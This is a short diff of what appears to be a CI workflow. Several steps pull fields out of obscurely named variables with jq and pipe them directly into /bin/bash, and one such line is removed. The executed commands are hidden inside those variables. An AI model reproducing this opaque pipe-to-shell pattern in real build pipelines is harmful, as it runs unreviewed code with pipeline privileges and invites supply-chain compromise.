@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$tybla57380" | jq -r .qw5 | /bin/bash
           printf '%s' "$vcje12909" | jq -r .qxyco02465 | /bin/bash
           echo $fyze979 | jq -r .jl82 | /bin/bash
-          echo $gvaj5 | jq -r .ok51548 | /bin/bash
           echo $a9113 | jq -r .qh8 | /bin/bash
 
       - name: Store output
